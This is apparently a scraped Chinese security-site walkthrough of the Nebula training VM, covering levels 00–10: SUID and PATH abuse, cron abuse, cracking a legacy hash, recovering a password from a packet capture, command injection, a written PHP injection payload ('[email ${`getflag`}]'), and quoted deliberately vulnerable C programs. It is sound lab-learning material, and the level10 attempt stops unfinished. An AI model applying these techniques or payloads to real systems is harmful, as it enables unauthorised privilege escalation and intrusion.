<head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head><script src="static/js/header/jquery.min.js?ver=3.6.1" type="text/javascript"></script>
<script src="static/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1" type="text/javascript"></script>
<script src="static/js/highslide/highslide-with-html.packed.js" type="text/javascript"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "static/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
<script language="JavaScript" src="static/buf/plugins/cartpauj-pm/js/script.js" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/layer.js"></script>
<script src="static/buf/plugins/simditor/highlight/highlight.pack.js" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="static/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="static/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="static/js/focus/bjqs-1.3.min.js" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript"></script>
<script src="static/js/new/setint.js" type="text/javascript"></script>
<script src="static/js/colum/swiper-3.4.2.min.js"></script>
<script type="application/ecmascript">
    $('.icon-wechat').hover(function(){
        $('.wechatImgdiv').show()
    },function(){
        $('.wechatImgdiv').hide()
    })
</script>
<script src="static/js/header/header.js" type="text/javascript"></script>
<script>
		jQuery(window).load(function () {
			jQuery(".main-header").sticky({topSpacing: 0});
		});
	</script>
<script>
                    $('.user-detial .test-info').mouseover(function() {
                        var _title = $(this).find('.text').attr('data-title');
                        if (_title) {
                            var str = '<span class="text-title">' + _title + '</span>';
                            $(this).append(str);
                        }
                    }).mouseout(function() {
                        $('.user-detial .test-info .text-title').remove();
                    });
                </script>
<script type="text/javascript">
				jQuery("#pagination a").live("click", function () {
					var _url = jQuery(this).attr("href");
					jQuery(this).parents("li").addClass("current").blur().parents("#menupage").find("li").not(jQuery(this).parents("li")).removeClass("current");
					jQuery.ajax({
						type: "POST",
						url: _url + "#timeline",
						success: function (data) {
							result = jQuery(data).find("#timeline .news_inner");
							nextHref = jQuery(data).find("#pagination a").attr("href");
							if (nextHref != undefined) {
								jQuery("#pagination a").attr("href", nextHref);
							} else {
								jQuery("#pagination").remove();
							}
							jQuery(function () {
								if (_url.indexOf("page") < 1) {
									jQuery("#timeline").html('');
								}
								jQuery("#timeline").append(result.fadeIn(200));
							});
						}
					});
					return false;
				});
			</script>
<script>
    $('.star_score > a').click(function() {
        $(this).addClass('active');
        $(this).siblings().removeClass('active');
    });
    $('.star_score > a').hover(function() {
        $(this).siblings().removeClass('active');
    });
    $(document).on('click', function() {
        $('.bottom_tools .tips-wrap').hide(500);
    });
    $('.bottom_tools ul li.fb-tips').click(function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $(this).find('.tips-wrap').toggle(500);
    });
    $('.bottom_tools .tips-wrap').click(function(event) {
        var evt = evt || event;
        evt.stopPropagation();
        $(this).show();
    });
    $('.feedback').on('click',function () {
        var content = $('#feedback-content').val();
        if(!content){
            $('#feedback-content').focus();
            $('.feedback-error').text('反馈内容不能为空！').show();
            return;
        }
        var contact = $('#feedback-contact').val();
        if(!contact){
            $('#feedback-contact').focus();
            $('.feedback-error').text('联系方式不能为空！').show();
            return;
        }
        var score = $('.star_score').children('.active').attr('data-id')
        if(!score){
            $('.feedback-error').text('给FreeBuf打个分吧！').show();
            return;
        }
        var yzm = $('#yzm').val();
        var _url = 'static/verify';
        $.ajax({
            type: "post",
            url: _url,
            data: {'content':content,'contact':contact,'score':score,'feedback_status':1,'yzm':yzm},
            success: function (data) {
                $("#captcha").trigger('click')
                if(data.code ==200){
                    layer.open({
                        title: '系统提示',
                        btnAlign: 'c',
                        content: data.msg,
                        area: '278px',
                    });
                }else {
                    layer.open({
                        title: '系统提示',
                        btnAlign: 'c',
                        content: data.msg,
                        area: '278px',
                    });
                }
            },
        })
    })

    $(document).on('click', '.appeal-wrap-public .appeal-main', function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $('.appeal-wrap-public').show();
    });
    $(document).on('click', '.appeal-main .close', function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $('.appeal-wrap').hide();
    });
    $(document).on('click', '.appeal-main .appeal-footer .btn-sure', function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $('.appeal-wrap-public').hide();
    });

    $('.complain').on('click',function () {
        var _url = 'static/verify';
        var token = $('#complain_token').val();
        $.ajax({
            type: "post",
            url: _url,
            data: {'complain_token':token,'complain_status':1},
            success: function (data) {
            },
        })
    })
</script>
<script src="static/js/new/backtop.js"></script>
<script type="text/javascript">
jQuery(function(){	
	jQuery('.tabPanes ul li').click(function(){
		jQuery(this).addClass('hit').siblings().removeClass('hit');
		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
	})
	jQuery('.vulbox-nav').click(function(e) { 
        e.stopPropagation(); 
    });  
})
</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
jQuery(function() {
    jQuery(".simditor pre").each(function(i, block){
        hljs.highlightBlock(block);    
    });
    hljs.initHighlightingOnLoad();
});
</script>
<script>
/* <![CDATA[ */
var rcGlobal = {
	serverUrl		:'static',
	infoTemp		:'%REVIEWER% on %POST%',
	loadingText		:'Loading',
	noCommentsText	:'No comments',
	newestText		:'&laquo; 最新',
	newerText		:'&laquo; 新一点',
	olderText		:'旧一点 &raquo;',
	showContent		:'1',
	external		:'1',
	avatarSize		:'32',
	avatarPosition	:'left',
	anonymous		:'Anonymous'
};
/* ]]> */
</script>
<script src="static/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3" type="text/javascript"></script>

<link href="static/buf/plugins/wp-favorite-posts/wpfp.css" id="wpfp-css" rel="stylesheet" type="text/css"/>
<link href="static/css/recentcomments/wp-recentcomments.css?ver=2.2.3" id="wp-recentcomments-css" media="screen" rel="stylesheet" type="text/css"/>
<link href="static/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1" id="mycred-widget-css" media="all" rel="stylesheet" type="text/css"/>
<link href="static/css/highslide/highslide.css" rel="stylesheet" type="text/css"/>
<link href="static/buf/plugins/cartpauj-pm/style/style.css" rel="stylesheet" type="text/css"/>
<link href=" static/buf/plugins/simditor/highlight/styles/default.css" rel="stylesheet" type="text/css"/>
<link href="https://static.freebuf.com/images/favicon.ico" rel="shortcut icon"/>
<link href="static/css/new/header.css" rel="stylesheet"/>
<link href="static/css/new/bootstrap.min.css?ver=2016051701" media="screen" rel="stylesheet"/>
<link href="static/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css"/>
<link href="static/css/new/style.css?ver=2018112123749359438534" rel="stylesheet" type="text/css"/>

<div id="contenttxt">
                            <h2>下载地址</h2>
<pre>https://download.vulnhub.com/exploitexercises/exploit-exercises-nebula-5.iso</pre>
<h2>实战演练</h2>
<p>找到IP是192.168.199.117</p>
<p><img alt="image.png" data-original="images/20190329/1553867889_5c9e247104be1.png" src="images/20190329/1553867889_5c9e247104be1.png" width="690" height="248" /></p>
<noscript><img alt="image.png" src="images/20190329/1553867889_5c9e247104be1.png" width="690" height="248" /></p></noscript>
<h3>level00</h3>
<p><b>详情</b></p>
<p><span style="color:rgb(122,122,122);"></span></p>
<pre>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</pre>
</p>
<p>使用用户名和密码为level00登录ssh</p>
<p><img alt="image.png" data-original="images/20190329/1553867997_5c9e24ddf3625.png" src="images/20190329/1553867997_5c9e24ddf3625.png" width="690" height="609" />按照详情，要找到<a href="https://www.cnblogs.com/Q--T/p/7864795.html">SUID</a>的程序</p>
<noscript><img alt="image.png" src="images/20190329/1553867997_5c9e24ddf3625.png" width="690" height="609" />按照详情，要找到<a href="https://www.cnblogs.com/Q--T/p/7864795.html">SUID</a>的程序</p></noscript>
<p><img alt="image.png" data-original="images/20190329/1553868372_5c9e2654d468f.png" src="images/20190329/1553868372_5c9e2654d468f.png" width="690" height="365" />执行这个文件</p>
<noscript><img alt="image.png" src="images/20190329/1553868372_5c9e2654d468f.png" width="690" height="365" />执行这个文件</p></noscript>
<h3><img alt="image.png" data-original="images/20190329/1553868500_5c9e26d4f03b7.png" src="images/20190329/1553868500_5c9e26d4f03b7.png" width="652" height="199" /><br />level01</h3>
<noscript><img alt="image.png" src="images/20190329/1553868500_5c9e26d4f03b7.png" width="652" height="199" /><br />level01</h3></noscript>
<p><b>详情</b></p>
</p>
<pre>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</pre>
<p>使用用户名和密码为level01登录ssh</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190329/1553868889_5c9e28595f4ee.png" src="images/20190329/1553868889_5c9e28595f4ee.png" width="683" height="675" />找到文件的位置</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190329/1553868889_5c9e28595f4ee.png" width="683" height="675" />找到文件的位置</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190329/1553869086_5c9e291e8aab2.png" src="images/20190329/1553869086_5c9e291e8aab2.png" width="577" height="200" />调试运行文件</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190329/1553869086_5c9e291e8aab2.png" width="577" height="200" />调试运行文件</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190329/1553871891_5c9e34131b1c7.png" src="images/20190329/1553871891_5c9e34131b1c7.png" width="690" height="154" />看到env echo这条命令</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190329/1553871891_5c9e34131b1c7.png" width="690" height="154" />看到env echo这条命令</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190329/1553872475_5c9e365b90aa6.png" src="images/20190329/1553872475_5c9e365b90aa6.png" width="429" height="151" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190329/1553872475_5c9e365b90aa6.png" width="429" height="151" /></p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190329/1553872397_5c9e360de6805.png" src="images/20190329/1553872397_5c9e360de6805.png" width="690" height="500" />添加环境变量</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190329/1553872397_5c9e360de6805.png" width="690" height="500" />添加环境变量</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190329/1553872600_5c9e36d8339b9.png" src="images/20190329/1553872600_5c9e36d8339b9.png" width="690" height="136" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190329/1553872600_5c9e36d8339b9.png" width="690" height="136" /></p></noscript>
<p>修改echo为getflag<br /><img style="margin:15px auto;" alt="image.png" data-original="images/20190329/1553872697_5c9e37391eef7.png" src="images/20190329/1553872697_5c9e37391eef7.png" width="690" height="264" />成功利用环境变量执行了程序</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190329/1553872697_5c9e37391eef7.png" width="690" height="264" />成功利用环境变量执行了程序</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190329/1553872825_5c9e37b91263b.png" src="images/20190329/1553872825_5c9e37b91263b.png" width="690" height="214" />但是直接执行getflag是不行的</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190329/1553872825_5c9e37b91263b.png" width="690" height="214" />但是直接执行getflag是不行的</p></noscript>
<h3><img style="margin:15px auto;" alt="image.png" data-original="images/20190329/1553872886_5c9e37f6cfd1f.png" src="images/20190329/1553872886_5c9e37f6cfd1f.png" width="623" height="92" />level02</h3>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190329/1553872886_5c9e37f6cfd1f.png" width="623" height="92" />level02</h3></noscript>
<p><b>详情</b></p>
<pre>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</pre>
<p><span style="background-color:transparent;">使用用户名和密码为level02登录ssh</span></p>
<p>看到运行结果就是调用环境变量USER</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190329/1553873987_5c9e3c43c4362.png" src="images/20190329/1553873987_5c9e3c43c4362.png" width="690" height="319" />所以修改环境变量USER</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190329/1553873987_5c9e3c43c4362.png" width="690" height="319" />所以修改环境变量USER</p></noscript>
<h3><img style="margin:15px auto;" alt="image.png" data-original="images/20190329/1553874052_5c9e3c8456814.png" src="images/20190329/1553874052_5c9e3c8456814.png" width="609" height="154" />level03</h3>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190329/1553874052_5c9e3c8456814.png" width="609" height="154" />level03</h3></noscript>
<p><b>详情</b></p>
<pre>Check the home directory of flag03 and take note of the files there. There is a crontab that is called every couple of minutes.</pre>
<p><span style="background-color:transparent;">使用用户名和密码为level03登录ssh</span></p>
<p><span style="background-color:transparent;"><img style="margin:15px auto;" alt="image.png" data-original="images/20190329/1553874380_5c9e3dcceb6d1.png" src="images/20190329/1553874380_5c9e3dcceb6d1.png" width="622" height="414" /></span></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190329/1553874380_5c9e3dcceb6d1.png" width="622" height="414" /></span></p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553875466_5c9e420a27d73.png" src="images/20190330/1553875466_5c9e420a27d73.png" width="609" height="301" /><br />可能是由于权限问题</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553875466_5c9e420a27d73.png" width="609" height="301" /><br />可能是由于权限问题</p></noscript>
<h3><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553912370_5c9ed232aac45.png" src="images/20190330/1553912370_5c9ed232aac45.png" width="690" height="352" />level04</h3>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553912370_5c9ed232aac45.png" width="690" height="352" />level04</h3></noscript>
<div><span style="color:rgb(51,51,51);">使用用户名和密码为level04登录ssh</span></div>
<pre>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it <img data-original="images/index/smilies/icon_smile.gif" src="images/index/smilies/icon_smile.gif" alt=':)' class='wp-smiley' /> </pre>
<noscript><img src='images/index/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /> </pre></noscript>
<div>程序代码</div>
</p>
<pre>#include &lt;stdlib.h&gt;

#include &lt;unistd.h&gt;

#include &lt;string.h&gt;

#include &lt;sys/types.h&gt;

#include &lt;stdio.h&gt;

#include &lt;fcntl.h&gt;

int main(int argc, char **argv, char **envp)

{

  char buf[1024];

  int fd, rc;

  if(argc == 1) {

      printf("%s [file to read]\n", argv[0]);

      exit(EXIT_FAILURE);

  }

  if(strstr(argv[1], "token") = NULL) {

      printf("You may not access '%s'\n", argv[1]);

      exit(EXIT_FAILURE);

  }

  fd = open(argv[1], O_RDONLY);

  if(fd == -1) {

      err(EXIT_FAILURE, "Unable to open %s", argv[1]);

  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {

      err(EXIT_FAILURE, "Unable to read fd %d", fd);

  }

  write(1, buf, rc);

}<br /></pre>
<p></p>
<div></div>
<div>调试一下程序</div>
<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553913110_5c9ed516886ef.png" src="images/20190330/1553913110_5c9ed516886ef.png" width="690" height="299" />核心问题就是这个strstr函数</div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553913110_5c9ed516886ef.png" width="690" height="299" />核心问题就是这个strstr函数</div></noscript>
<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553913212_5c9ed57c3f967.png" src="images/20190330/1553913212_5c9ed57c3f967.png" width="690" height="664" />我们来绕过它，获取到这个uuid就是它的密码</div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553913212_5c9ed57c3f967.png" width="690" height="664" />我们来绕过它，获取到这个uuid就是它的密码</div></noscript>
<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553913327_5c9ed5efe7147.png" src="images/20190330/1553913327_5c9ed5efe7147.png" width="690" height="284" /></div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553913327_5c9ed5efe7147.png" width="690" height="284" /></div></noscript>
<h3>level05</h3>
<div><span style="color:rgb(51,51,51);">使用用户名和密码为level05登录ssh</span></div>
<div><span style="color:rgb(51,51,51);"><b>详情</b></span></div>
<pre>Check the flag05 home directory. You are looking for weak directory permissions</pre>
<div>进入到flag05的目录</div>
<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553914060_5c9ed8cc7fbf2.png" src="images/20190330/1553914060_5c9ed8cc7fbf2.png" width="690" height="558" /></div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553914060_5c9ed8cc7fbf2.png" width="690" height="558" /></div></noscript>
<p>使用证书登录
<div><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553914164_5c9ed9344d23c.png" width="690" height="850" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553914176_5c9ed940797fe.png" src="images/20190330/1553914176_5c9ed940797fe.png" width="690" height="62" /><br />
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553914164_5c9ed9344d23c.png" width="690" height="850" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553914176_5c9ed940797fe.png" width="690" height="62" /><br /></noscript>
<h3>level06</h3>
<p>使用用户名和密码为level06登录ssh</p>
<p><b style="color:rgb(51,51,51);">详情</b></p>
<p><span style="color:rgb(51,51,51);"></span></p>
<pre>The flag06 account credentials came from a legacy unix system.</pre>
<p>查看passwd文件，找到了一个hash密码
</p>
<p><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553914797_5c9edbadcd922.png" src="images/20190330/1553914797_5c9edbadcd922.png" width="690" height="682" />用john爆破一下，找到密码是hello</span></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553914797_5c9edbadcd922.png" width="690" height="682" />用john爆破一下，找到密码是hello</span></p></noscript>
<p><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553914889_5c9edc09d7442.png" src="images/20190330/1553914889_5c9edc09d7442.png" width="690" height="395" />用这个密码登录一下</span></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553914889_5c9edc09d7442.png" width="690" height="395" />用这个密码登录一下</span></p></noscript>
<p><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553914928_5c9edc30c3f96.png" src="images/20190330/1553914928_5c9edc30c3f96.png" width="669" height="113" /><br /></span></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553914928_5c9edc30c3f96.png" width="669" height="113" /><br /></span></p></noscript>
<h3>level07</h3>
<p>使用用户名和密码为level07登录ssh</p>
<p><b>详情</b></p>
<p><span style="color:rgb(51,51,51);"></span></p>
<pre>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</pre>
<p>进入flag07目录</p></div>
<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553918226_5c9ee9126fdde.png" src="images/20190330/1553918226_5c9ee9126fdde.png" width="690" height="188" />
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553918226_5c9ee9126fdde.png" width="690" height="188" /></noscript>
<p>命令执行漏洞</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553918255_5c9ee92f6f3b9.png" src="images/20190330/1553918255_5c9ee92f6f3b9.png" width="690" height="409" />在7007端口开启了http服务</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553918255_5c9ee92f6f3b9.png" width="690" height="409" />在7007端口开启了http服务</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553918304_5c9ee9606a33c.png" src="images/20190330/1553918304_5c9ee9606a33c.png" width="690" height="449" /><b>vmware虚拟机的内存要设置1G以上，不然http服务不能启动</b></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553918304_5c9ee9606a33c.png" width="690" height="449" /><b>vmware虚拟机的内存要设置1G以上，不然http服务不能启动</b></p></noscript>
<p>测试</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553918962_5c9eebf2539ff.png" src="images/20190330/1553918962_5c9eebf2539ff.png" width="690" height="188" />需要进行URL编码</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553918962_5c9eebf2539ff.png" width="690" height="188" />需要进行URL编码</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553919198_5c9eecde4e5cd.png" src="images/20190330/1553919198_5c9eecde4e5cd.png" width="690" height="272" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553919198_5c9eecde4e5cd.png" width="690" height="272" /></p></noscript>
<h3>level08</h3>
<p>使用用户名和密码为level08登录ssh</p>
<p><b>详情</b></p>
</p>
<pre>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</pre>
<p>进入到flag08目录查看</p></div>
<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553920336_5c9ef15099182.png" src="images/20190330/1553920336_5c9ef15099182.png" width="690" height="263" />将这个文件导出使用wireshark进行分析</div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920336_5c9ef15099182.png" width="690" height="263" />将这个文件导出使用wireshark进行分析</div></noscript>
<div><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920517_5c9ef205afec4.png" width="690" height="359" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920566_5c9ef236ad14a.png" width="690" height="271" />选择第一个右键follow tcpstream<img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553920640_5c9ef280f02ae.png" src="images/20190330/1553920640_5c9ef280f02ae.png" width="690" height="196" /></div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920517_5c9ef205afec4.png" width="690" height="359" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920566_5c9ef236ad14a.png" width="690" height="271" />选择第一个右键follow tcpstream<img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920640_5c9ef280f02ae.png" width="690" height="196" /></div></noscript>
<div>&#8230;是代表什么，我用使用hex看看</div>
<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553920689_5c9ef2b1b0b1a.png" src="images/20190330/1553920689_5c9ef2b1b0b1a.png" width="690" height="653" />看到7f和0d</div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920689_5c9ef2b1b0b1a.png" width="690" height="653" />看到7f和0d</div></noscript>
<div><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920733_5c9ef2dd22117.png" width="690" height="327" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920801_5c9ef321e87c3.png" width="690" height="438" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553920826_5c9ef33ab47e0.png" src="images/20190330/1553920826_5c9ef33ab47e0.png" width="690" height="411" />所以它的密码就是backdoor退三格00Rm8退一格ate回车，就是backd00Rmate</div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920733_5c9ef2dd22117.png" width="690" height="327" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920801_5c9ef321e87c3.png" width="690" height="438" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920826_5c9ef33ab47e0.png" width="690" height="411" />所以它的密码就是backdoor退三格00Rm8退一格ate回车，就是backd00Rmate</div></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553920937_5c9ef3a9dfecf.png" src="images/20190330/1553920937_5c9ef3a9dfecf.png" width="620" height="143" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553920937_5c9ef3a9dfecf.png" width="620" height="143" /></p></noscript>
<h3>level09</h3>
<p>使用用户名和密码为level09登录ssh</p>
<p><b>详情</b></p>
</p>
<pre>There’s a C setuid wrapper for some vulnerable PHP code…</pre>
<p>进[email ${`getflag`}]入flag09目录查看
</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553922684_5c9efa7ce6dc3.png" src="images/20190330/1553922684_5c9efa7ce6dc3.png" width="690" height="515" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553922684_5c9efa7ce6dc3.png" width="690" height="515" /></p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553922713_5c9efa9944961.png" src="images/20190330/1553922713_5c9efa9944961.png" width="690" height="437" />payload</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553922713_5c9efa9944961.png" width="690" height="437" />payload</p></noscript>
<pre>[email ${`getflag`}]</pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553923351_5c9efd179d869.png" src="images/20190330/1553923351_5c9efd179d869.png" width="690" height="134" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553923351_5c9efd179d869.png" width="690" height="134" /></p></noscript>
<h3>level10</h3>
<p>使用用户名和密码为level10登录ssh</p>
<p><b>详情</b></p>
</p>
<pre>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</pre>
<p>程序代码
<pre>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc &lt; 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&amp;sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}<br /></pre>
<div>进入到level10目录，看到X</div>
<div><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553925742_5c9f066e3ffa3.png" width="674" height="242" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553926212_5c9f0844ae7c2.png" src="images/20190330/1553926212_5c9f0844ae7c2.png" width="479" height="66" />找到了密码，不过我想研究另外一种</div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553925742_5c9f066e3ffa3.png" width="674" height="242" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553926212_5c9f0844ae7c2.png" width="479" height="66" />找到了密码，不过我想研究另外一种</div></noscript>
<div>进入到flag10</div>
<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553926261_5c9f087561ac8.png" src="images/20190330/1553926261_5c9f087561ac8.png" width="640" height="259" />从程序代码可以看出，要先运行access()，才能运行open()</div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553926261_5c9f087561ac8.png" width="640" height="259" />从程序代码可以看出，要先运行access()，才能运行open()</div></noscript>
<div><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553926582_5c9f09b6bf6f7.png" width="440" height="124" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553926828_5c9f0aace12e1.png" src="images/20190330/1553926828_5c9f0aace12e1.png" width="690" height="129" /><br />使用ncat监听18211端口</div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553926582_5c9f09b6bf6f7.png" width="440" height="124" /><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553926828_5c9f0aace12e1.png" width="690" height="129" /><br />使用ncat监听18211端口</div></noscript>
<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190330/1553929474_5c9f1502814ca.png" src="images/20190330/1553929474_5c9f1502814ca.png" width="690" height="228" />flag10搞不了，暂且放下</div>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190330/1553929474_5c9f1502814ca.png" width="690" height="228" />flag10搞不了，暂且放下</div></noscript>
